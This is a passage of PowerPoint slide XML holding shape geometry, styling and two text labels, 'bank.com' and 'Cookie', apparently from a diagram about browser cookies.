                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87067" name="object 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692088" y="3437405"/>
            <a:ext cx="1155607" cy="442632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId11"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87068" name="object 33"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692088" y="3437405"/>
            <a:ext cx="1155607" cy="442632"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T1" fmla="*/ 0 h 501650"/>
              <a:gd name="T2" fmla="*/ 120806 w 1309370"/>
              <a:gd name="T3" fmla="*/ 0 h 501650"/>
              <a:gd name="T4" fmla="*/ 73790 w 1309370"/>
              <a:gd name="T5" fmla="*/ 9436 h 501650"/>
              <a:gd name="T6" fmla="*/ 35396 w 1309370"/>
              <a:gd name="T7" fmla="*/ 35169 h 501650"/>
              <a:gd name="T8" fmla="*/ 9486 w 1309370"/>
              <a:gd name="T9" fmla="*/ 73337 h 501650"/>
              <a:gd name="T10" fmla="*/ 0 w 1309370"/>
              <a:gd name="T11" fmla="*/ 120078 h 501650"/>
              <a:gd name="T12" fmla="*/ 0 w 1309370"/>
              <a:gd name="T13" fmla="*/ 381076 h 501650"/>
              <a:gd name="T14" fmla="*/ 9486 w 1309370"/>
              <a:gd name="T15" fmla="*/ 427816 h 501650"/>
              <a:gd name="T16" fmla="*/ 35396 w 1309370"/>
              <a:gd name="T17" fmla="*/ 465985 h 501650"/>
              <a:gd name="T18" fmla="*/ 73790 w 1309370"/>
              <a:gd name="T19" fmla="*/ 491718 h 501650"/>
              <a:gd name="T20" fmla="*/ 120806 w 1309370"/>
              <a:gd name="T21" fmla="*/ 501154 h 501650"/>
              <a:gd name="T22" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T23" fmla="*/ 501154 h 501650"/>
              <a:gd name="T24" fmla="*/ 1243479 w 1309370"/>
              <a:gd name="T25" fmla="*/ 491718 h 501650"/>
              <a:gd name="T26" fmla="*/ 1281884 w 1309370"/>
              <a:gd name="T27" fmla="*/ 465985 h 501650"/>
              <a:gd name="T28" fmla="*/ 1307775 w 1309370"/>
              <a:gd name="T29" fmla="*/ 427816 h 501650"/>
              <a:gd name="T30" fmla="*/ 1317269 w 1309370"/>
              <a:gd name="T31" fmla="*/ 381076 h 501650"/>
              <a:gd name="T32" fmla="*/ 1317269 w 1309370"/>
              <a:gd name="T33" fmla="*/ 120078 h 501650"/>
              <a:gd name="T34" fmla="*/ 1307775 w 1309370"/>
              <a:gd name="T35" fmla="*/ 73337 h 501650"/>
              <a:gd name="T36" fmla="*/ 1281884 w 1309370"/>
              <a:gd name="T37" fmla="*/ 35169 h 501650"/>
              <a:gd name="T38" fmla="*/ 1243479 w 1309370"/>
              <a:gd name="T39" fmla="*/ 9436 h 501650"/>
              <a:gd name="T40" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T41" fmla="*/ 0 h 50165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1309370" h="501650">
                <a:moveTo>
                  <a:pt x="1189205" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="120081" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73340" y="9436"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35171" y="35169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9436" y="73337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="120078"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="381076"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9436" y="427816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35171" y="465985"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73340" y="491718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120081" y="501154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1189205" y="501154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1235953" y="491718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1274125" y="465985"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1299860" y="427816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309296" y="381076"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309296" y="120078"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1299860" y="73337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1274125" y="35169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1235953" y="9436"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1189205" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87069" name="object 34"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1802747" y="3529853"/>
            <a:ext cx="937091"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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1500">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87070" name="object 35"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1855975" y="3884239"/>
            <a:ext cx="84044" cy="319368"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 111769 w 94614"/>
              <a:gd name="T1" fmla="*/ 361732 h 361950"/>
              <a:gd name="T2" fmla="*/ 51650 w 94614"/>
              <a:gd name="T3" fmla="*/ 310812 h 361950"/>
              <a:gd name="T4" fmla="*/ 30319 w 94614"/>
              <a:gd name="T5" fmla="*/ 270240 h 361950"/>
              <a:gd name="T6" fmla="*/ 14605 w 94614"/>
              <a:gd name="T7" fmla="*/ 225176 h 361950"/>
              <a:gd name="T8" fmla="*/ 4498 w 94614"/>
              <a:gd name="T9" fmla="*/ 175621 h 361950"/>
              <a:gd name="T10" fmla="*/ 0 w 94614"/>
              <a:gd name="T11" fmla="*/ 121573 h 361950"/>
              <a:gd name="T12" fmla="*/ 1105 w 94614"/>
              <a:gd name="T13" fmla="*/ 63033 h 361950"/>
              <a:gd name="T14" fmla="*/ 7820 w 94614"/>
              <a:gd name="T15" fmla="*/ 0 h 36195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94614" h="361950">
                <a:moveTo>
                  <a:pt x="94534" y="361732"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="43681" y="310812"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25644" y="270240"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12352" y="225176"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3804" y="175621"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="121573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="936" y="63033"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6614" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="635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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87071" name="object 36"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1861578" y="4088747"/>
            <a:ext cx="256334" cy="207309"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 124426 w 290195"/>
              <a:gd name="T1" fmla="*/ 0 h 235585"/>
              <a:gd name="T2" fmla="*/ 0 w 290195"/>
              <a:gd name="T3" fmla="*/ 214099 h 235585"/>
              <a:gd name="T4" fmla="*/ 297598 w 290195"/>
              <a:gd name="T5" fmla="*/ 220225 h 235585"/>
              <a:gd name="T6" fmla="*/ 124426 w 290195"/>
              <a:gd name="T7" fmla="*/ 0 h 23558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90195" h="235585">
                <a:moveTo>
                  <a:pt x="121076" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="229044"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289585" y="235597"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12107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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87072" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6640887" y="4353485"/>
            <a:ext cx="983316" cy="487456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId9"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="object 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6778159" y="4034118"/>
            <a:ext cx="931489" cy="673774"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1141553" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="2118" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11191" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="724"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87074" name="object 37"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="9495585" y="2420471"/>
            <a:ext cx="40621" cy="1986243"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 45719"/>
              <a:gd name="T1" fmla="*/ 0 h 847089"/>
              <a:gd name="T2" fmla="*/ 0 w 45719"/>
              <a:gd name="T3" fmla="*/ 2147483646 h 847089"/>
              <a:gd name="T4" fmla="*/ 0 60000 65536"/>
              <a:gd name="T5" fmla="*/ 0 60000 65536"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="T4">
                <a:pos x="T0" y="T1"/>
              </a:cxn>
              <a:cxn ang="T5">
                <a:pos x="T2" y="T3"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="45719" h="847089">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="846892"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
